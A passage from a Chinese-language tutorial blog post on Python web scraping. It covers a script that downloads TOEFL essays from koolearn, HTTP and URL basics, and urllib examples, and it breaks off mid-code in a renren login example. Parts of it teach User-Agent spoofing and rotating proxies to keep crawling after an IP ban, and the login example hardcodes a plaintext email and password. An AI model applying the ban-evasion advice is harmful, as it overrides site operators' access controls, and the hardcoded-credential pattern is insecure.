        <content type="html"><![CDATA[<h1 id="使用requests和bs4爬取新东方作文"><a href="#使用requests和bs4爬取新东方作文" class="headerlink" title="使用requests和bs4爬取新东方作文"></a>使用requests和bs4爬取新东方作文</h1><p>其实这是当时学爬虫的最初动力，爬点范文（doge）<br>技术路线的学习都记录在下面，深感博客杂乱不完整，试图整理了一遍。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetchUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：访问 url 的网页，获取网页内容并返回</span></span><br><span class="line"><span class="string">    参数：目标网页的 url</span></span><br><span class="line"><span class="string">    返回：目标网页的 html 内容</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getContent</span>(<span class="params">html</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：解析 HTML 网页，获取新闻的文章内容</span></span><br><span class="line"><span class="string">    参数：html 网页内容</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    new_html = html.replace(<span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    bsobj = bs4.BeautifulSoup(new_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取文章 内容</span></span><br><span class="line">    temp = bsobj.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;style_stem-text__3Vgg5&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> temp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        text = temp.find(<span class="string">&#x27;p&#x27;</span>).get_text()</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveFile</span>(<span class="params">content, path, filename</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：将文章内容 content 保存到本地文件中</span></span><br><span class="line"><span class="string">    参数：要保存的内容，路径，文件名</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 如果没有该文件夹，则自动生成</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.makedirs(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path + filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPageList</span>(<span class="params">pageUrl</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：获取文章链接列表</span></span><br><span class="line"><span class="string">    参数：文章链接</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    html = fetchUrl(pageUrl)</span><br><span class="line">    bsobj = bs4.BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    pageList = bsobj.find_all(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;style_question-item-content__zwx24&#x27;</span>&#125;)</span><br><span class="line">    linkList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> pageList:</span><br><span class="line">        temp = page.find(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        link = temp[<span class="string">&quot;href&quot;</span>]</span><br><span class="line">        url = <span class="string">&quot;https://liuxue.koolearn.com&quot;</span> + link</span><br><span class="line">        linkList.append(url)</span><br><span class="line">    <span class="keyword">return</span> linkList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_article</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：爬取网页文章，并保存在 指定目录下</span></span><br><span class="line"><span class="string">    参数：文件保存的根目录</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    path = <span class="string">&quot;D:/TOEFL/Writing/&quot;</span></span><br><span class="line">    baseurl = <span class="string">&quot;https://liuxue.koolearn.com/toefl/write-0-&quot;</span></span><br><span class="line">    suffix = <span class="string">&quot;-0/&quot;</span></span><br><span class="line">    var = <span class="number">997</span></span><br><span class="line">    cnt = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> var &gt;= <span class="number">953</span>:</span><br><span class="line">        page_url = baseurl + <span class="built_in">str</span>(var) + suffix</span><br><span class="line">        articles = getPageList(page_url)</span><br><span class="line">        <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">            <span class="comment"># 获取新闻文章内容</span></span><br><span class="line">            html = fetchUrl(article)</span><br><span class="line">            content = getContent(html)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># 生成文件名</span></span><br><span class="line">                fileName = <span class="built_in">str</span>(cnt) + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">                saveFile(content, path, fileName)</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        var -= <span class="number">11</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cnt = download_article()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;all done!\n&quot;</span> + <span class="built_in">str</span>(cnt))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="基础知识：http协议与url"><a href="#基础知识：http协议与url" class="headerlink" title="基础知识：http协议与url"></a>基础知识：http协议与url</h1><h2 id="什么是http和https协议："><a href="#什么是http和https协议：" class="headerlink" title="什么是http和https协议："></a>什么是http和https协议：</h2><p>HTTP协议：全称是<code>HyperText Transfer Protocol</code>，中文意思是超文本传输协议，是一种发布和接收HTML页面的方法。服务器端口号是<code>80</code>端口。<br>HTTPS协议：是HTTP协议的加密版本，在HTTP下加入了SSL层。服务器端口号是<code>443</code>端口。</p><p>在浏览器中发送一个http请求的过程：</p><ol><li>当用户在浏览器的地址栏中输入一个URL并按回车键之后，浏览器会向HTTP服务器发送HTTP请求。HTTP请求主要分为“Get”和“Post”两种方法。</li><li>当我们在浏览器输入URL <a href="http://www.baidu.com">http://www.baidu.com</a> 的时候，浏览器发送一个Request请求去获取 <a href="http://www.baidu.com">http://www.baidu.com</a> 的html文件，服务器把Response文件对象发送回给浏览器。</li><li>浏览器分析Response中的 HTML，发现其中引用了很多其他文件，比如Images文件，CSS文件，JS文件。 浏览器会自动再次发送Request去获取图片，CSS文件，或者JS文件。</li><li>当所有的文件都下载成功后，网页会根据HTML语法结构，完整的显示出来了。</li></ol><h2 id="url详解："><a href="#url详解：" class="headerlink" title="url详解："></a>url详解：</h2><p><code>URL</code>是<code>Uniform Resource Locator</code>的简写，统一资源定位符。<br>一个<code>URL</code>由以下几部分组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://host:port/path/?query-string=xxx#anchor</span><br></pre></td></tr></table></figure><ul><li><strong>scheme</strong>：代表的是访问的协议，一般为<code>http</code>或者<code>https</code>以及<code>ftp</code>等。</li><li><strong>host</strong>：主机名，域名，比如<code>www.baidu.com</code>。</li><li><strong>port</strong>：端口号。当你访问一个网站的时候，浏览器默认使用80端口。</li><li><strong>path</strong>：查找路径。比如：<code>www.jianshu.com/trending/now</code>，后面的<code>trending/now</code>就是<code>path</code>。</li><li><strong>query-string</strong>：查询字符串，比如：<code>www.baidu.com/s?wd=python</code>，后面的<code>wd=python</code>就是查询字符串。</li><li><strong>anchor</strong>：锚点，后台一般不用管，前端用来做页面定位的。</li></ul><p>==在浏览器中请求一个<code>url</code>，浏览器会对这个url进行一个编码。除英文字母，数字和部分符号外，其他的全部使用百分号+十六进制码值进行编码。==</p><h2 id="常用的请求方法："><a href="#常用的请求方法：" class="headerlink" title="常用的请求方法："></a>常用的请求方法：</h2><p>在<code>Http</code>协议中，定义了八种请求方法。这里介绍两种常用的请求方法，分别是<code>get</code>请求和<code>post</code>请求。</p><ol><li><code>get</code>请求：一般情况下，只从服务器获取数据下来，并不会对服务器资源产生任何影响的时候会使用<code>get</code>请求。</li><li><code>post</code>请求：向服务器发送数据（登录）、上传文件等，会对服务器资源产生影响的时候会使用<code>post</code>请求。<br>以上是在网站开发中常用的两种方法。并且一般情况下都会遵循使用的原则。但是有的网站和服务器为了做反爬虫机制，也经常会不按常理出牌，有可能一个应该使用<code>get</code>方法的请求就一定要改成<code>post</code>请求，这个要视情况而定。</li></ol><h2 id="请求头常见参数："><a href="#请求头常见参数：" class="headerlink" title="请求头常见参数："></a>请求头常见参数：</h2><p>在<code>http</code>协议中，向服务器发送一个请求，数据分为三部分，第一个是把数据放在url中，第二个是把数据放在<code>body</code>中（在<code>post</code>请求中），第三个就是把数据放在<code>head</code>中。这里介绍在网络爬虫中经常会用到的一些请求头参数：</p><ol><li><code>User-Agent</code>：浏览器名称。这个在网络爬虫中经常会被使用到。请求一个网页的时候，服务器通过这个参数就可以知道这个请求是由哪种浏览器发送的。如果我们是通过爬虫发送请求，那么我们的<code>User-Agent</code>就是<code>Python</code>，这对于那些有反爬虫机制的网站来说，可以轻易的判断你这个请求是爬虫。因此我们要经常设置这个值为一些浏览器的值，来伪装我们的爬虫。</li><li><code>Referer</code>：表明当前这个请求是从哪个<code>url</code>过来的。这个一般也可以用来做反爬虫技术。如果不是从指定页面过来的，那么就不做相关的响应。</li><li><code>Cookie</code>：<code>http</code>协议是无状态的。也就是同一个人发送了两次请求，服务器没有能力知道这两个请求是否来自同一个人。因此这时候就用<code>cookie</code>来做标识。一般如果想要做登录后才能访问的网站，那么就需要发送<code>cookie</code>信息了。</li></ol><h2 id="常见响应状态码："><a href="#常见响应状态码：" class="headerlink" title="常见响应状态码："></a>常见响应状态码：</h2><ol><li><code>200</code>：请求正常，服务器正常的返回数据。</li><li><code>301</code>：永久重定向。比如在访问<code>www.jingdong.com</code>的时候会重定向到<code>www.jd.com</code>。</li><li><code>302</code>：临时重定向。比如在访问一个需要登录的页面的时候，而此时没有登录，那么就会重定向到登录页面。</li><li><code>400</code>：请求的<code>url</code>在服务器上找不到。换句话说就是请求<code>url</code>错误。</li><li><code>403</code>：服务器拒绝访问，权限不够。</li><li><code>500</code>：服务器内部错误。可能是服务器出现<code>bug</code>了。</li></ol><h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><p><code>urllib</code>库是<code>Python</code>中一个最基本的网络请求库。可以模拟浏览器的行为，向指定的服务器发送一个请求，并可以保存服务器返回的数据。</p><h2 id="urlopen函数："><a href="#urlopen函数：" class="headerlink" title="urlopen函数："></a>urlopen函数：</h2><p>在<code>Python3</code>的<code>urllib</code>库中，所有和网络请求相关的方法，都被集到<code>urllib.request</code>模块下面了，以先来看下<code>urlopen</code>函数基本的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">resp = request.urlopen(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><p>实际上，使用浏览器访问百度，右键查看源代码。你会发现，跟我们刚才打印出来的数据是一模一样的。也就是说，上面的三行代码就已经帮我们把百度的首页的全部代码爬下来了。一个基本的url请求对应的python代码真的非常简单。<br>以下对<code>urlopen</code>函数的进行详细讲解：  </p><ol><li><code>url</code>：请求的url。  </li><li><code>data</code>：请求的<code>data</code>，如果设置了这个值，那么将变成<code>post</code>请求。  </li><li>返回值：返回值是一个<code>http.client.HTTPResponse</code>对象，这个对象是一个类文件句柄对象。有<code>read(size)</code>、<code>readline</code>、<code>readlines</code>以及<code>getcode</code>等方法。</li></ol><h2 id="urlretrieve函数："><a href="#urlretrieve函数：" class="headerlink" title="urlretrieve函数："></a>urlretrieve函数：</h2><p>这个函数可以方便的将网页上的一个文件保存到本地。以下代码可以非常方便的将百度的首页下载到本地：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">request.urlretrieve(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>,<span class="string">&#x27;baidu.html&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="urlencode函数："><a href="#urlencode函数：" class="headerlink" title="urlencode函数："></a>urlencode函数：</h2><p>用浏览器发送请求的时候，==如果url中包含了中文或者其他特殊字符==，那么浏览器会自动的给我们进行编码。而如果使用代码发送请求，那么就必须手动的进行编码，这时候就应该使用<code>urlencode</code>函数来实现。<code>urlencode</code>可以把字典数据转换为<code>URL</code>编码的数据。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">data = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;爬虫基础&#x27;</span>,<span class="string">&#x27;greet&#x27;</span>:<span class="string">&#x27;hello world&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">100</span>&#125;</span><br><span class="line">qs = parse.urlencode(data)</span><br><span class="line"><span class="built_in">print</span>(qs)</span><br></pre></td></tr></table></figure><h2 id="parse-qs函数："><a href="#parse-qs函数：" class="headerlink" title="parse_qs函数："></a>parse_qs函数：</h2><p>可以将经过编码后的url参数进行解码。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">qs = <span class="string">&quot;name=%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80&amp;greet=hello+world&amp;age=100&quot;</span></span><br><span class="line"><span class="built_in">print</span>(parse.parse_qs(qs))</span><br></pre></td></tr></table></figure><h2 id="urlparse和urlsplit："><a href="#urlparse和urlsplit：" class="headerlink" title="urlparse和urlsplit："></a>urlparse和urlsplit：</h2><p>有时候拿到一个url，想要对这个url中的各个组成部分进行分割，那么这时候就可以使用<code>urlparse</code>或者是<code>urlsplit</code>来进行分割。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/s?username=zhiliao&#x27;</span></span><br><span class="line"></span><br><span class="line">result = parse.urlsplit(url)</span><br><span class="line"><span class="comment"># result = parse.urlparse(url)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;scheme:&#x27;</span>,result.scheme)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;netloc:&#x27;</span>,result.netloc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;path:&#x27;</span>,result.path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;query:&#x27;</span>,result.query)</span><br></pre></td></tr></table></figure><p><code>urlparse</code>和<code>urlsplit</code>基本上是一模一样的。==唯一不一样的地方是，<code>urlparse</code>里面多了一个<code>params</code>属性，而<code>urlsplit</code>没有这个<code>params</code>属性==。比如有一个<code>url</code>为：<code>url = &#39;http://www.baidu.com/s;hello?wd=python&amp;username=abc#1&#39;</code>，那么<code>urlparse</code>可以获取到<code>hello</code>，而<code>urlsplit</code>不可以获取到。<code>url</code>中的<code>params</code>也用得比较少。</p><h2 id="request-Request类："><a href="#request-Request类：" class="headerlink" title="request.Request类："></a>request.Request类：</h2><p>如果想要在请求的时候增加一些请求头，那么就必须使用<code>request.Request</code>类来实现。比如要增加一个<code>User-Agent</code>，示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&quot;http://www.baidu.com/&quot;</span>,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h2 id="ProxyHandler处理器（代理设置）"><a href="#ProxyHandler处理器（代理设置）" class="headerlink" title="ProxyHandler处理器（代理设置）"></a>ProxyHandler处理器（代理设置）</h2><p>很多网站会检测某一段时间某个IP的访问次数(通过流量统计，系统日志等)，如果访问次数多的不像正常人，它会禁止这个IP的访问。<br>所以我们可以设置一些代理服务器，每隔一段时间换一个代理，就算IP被禁止，依然可以换个IP继续爬取。<br>urllib中通过ProxyHandler来设置使用代理服务器，下面代码说明如何使用自定义opener来使用代理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是没有使用代理的</span></span><br><span class="line"><span class="comment"># resp = request.urlopen(&#x27;http://httpbin.org/get&#x27;)</span></span><br><span class="line"><span class="comment"># print(resp.read().decode(&quot;utf-8&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是使用了代理的</span></span><br><span class="line">handler = request.ProxyHandler(&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;218.66.161.88:31769&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line">req = request.Request(<span class="string">&quot;http://httpbin.org/ip&quot;</span>)</span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h2 id="“科学上网”代理"><a href="#“科学上网”代理" class="headerlink" title="“科学上网”代理"></a>“科学上网”代理</h2><p>查看当前使用的代理ip以及开放的端口，开放端口用<code>shodan</code>一般就可以搜到，也可以用<code>nmap</code>去扫描，VPN协议端口有三类，略去</p><h1 id="cookie相关："><a href="#cookie相关：" class="headerlink" title="cookie相关："></a>cookie相关：</h1><h2 id="cookie的格式："><a href="#cookie的格式：" class="headerlink" title="cookie的格式："></a>cookie的格式：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: NAME=VALUE；Expires/Max-age=DATE；Path=PATH；Domain=DOMAIN_NAME；SECURE</span><br></pre></td></tr></table></figure><p>参数意义：</p><ul><li>NAME：cookie的名字。</li><li>VALUE：cookie的值。</li><li>Expires：cookie的过期时间。</li><li>Path：cookie作用的路径。</li><li>Domain：cookie作用的域名。</li><li>SECURE：是否只在https协议下起作用。</li></ul><h2 id="使用cookielib库和HTTPCookieProcessor模拟登录："><a href="#使用cookielib库和HTTPCookieProcessor模拟登录：" class="headerlink" title="使用cookielib库和HTTPCookieProcessor模拟登录："></a>使用cookielib库和HTTPCookieProcessor模拟登录：</h2><p>Cookie 是指网站服务器为了辨别用户身份和进行Session跟踪，而储存在用户浏览器上的文本文件，Cookie可以保持登录信息到用户下次与服务器的会话。<br>这里以人人网为例。人人网中，要访问某个人的主页，必须先登录才能访问，登录说白了就是要有cookie信息。那么如果我们想要用代码的方式访问，就必须要有正确的cookie信息才能访问。<br>解决方案有两种，第一种是使用浏览器访问，然后将cookie信息复制下来，放到headers中。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;略去&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span></span><br><span class="line"></span><br><span class="line">req = request.Request(url,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;renren.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>但是每次在访问需要cookie的页面都要从浏览器中复制cookie比较麻烦。在Python处理Cookie，一般是通过<code>http.cookiejar</code>模块和<code>urllib模块的HTTPCookieProcessor</code>处理器类一起使用。<code>http.cookiejar</code>模块主要作用是提供用于存储cookie的对象。而<code>HTTPCookieProcessor</code>处理器主要作用是处理这些cookie对象，并构建handler对象。</p><h2 id="http-cookiejar模块："><a href="#http-cookiejar模块：" class="headerlink" title="http.cookiejar模块："></a>http.cookiejar模块：</h2><p>该模块主要的类有CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。这四个类的作用分别如下：  </p><ol><li>CookieJar：管理HTTP cookie值、存储HTTP请求生成的cookie、向传出的HTTP请求添加cookie的对象。整个cookie都存储在内存中，对CookieJar实例进行垃圾回收后cookie也将丢失。  </li><li>FileCookieJar (filename,delayload=None,policy=None)：从CookieJar派生而来，用来创建FileCookieJar实例，检索cookie信息并将cookie存储到文件中。filename是存储cookie的文件名。delayload为True时支持延迟访问访问文件，即只有在需要时才读取文件或在文件中存储数据。  </li><li>MozillaCookieJar (filename,delayload=None,policy=None)：从FileCookieJar派生而来，创建与Mozilla浏览器 cookies.txt兼容的FileCookieJar实例。  </li><li>LWPCookieJar (filename,delayload=None,policy=None)：从FileCookieJar派生而来，创建与libwww-perl标准的 Set-Cookie3 文件格式兼容的FileCookieJar实例。</li></ol><h2 id="登录人人网："><a href="#登录人人网：" class="headerlink" title="登录人人网："></a>登录人人网：</h2><p>利用<code>http.cookiejar</code>和<code>request.HTTPCookieProcessor</code>登录人人网。相关示例代码如下：（经测试人人网已经不能这样爬了，仅作一例）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> CookieJar</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_opener</span>():</span></span><br><span class="line">    cookiejar = CookieJar()</span><br><span class="line">    handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">    opener = request.build_opener(handler)</span><br><span class="line">    <span class="keyword">return</span> opener</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_renren</span>(<span class="params">opener</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;970138074@qq.com&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">    data = parse.urlencode(data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    login_url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">    req = request.Request(login_url, headers=headers, 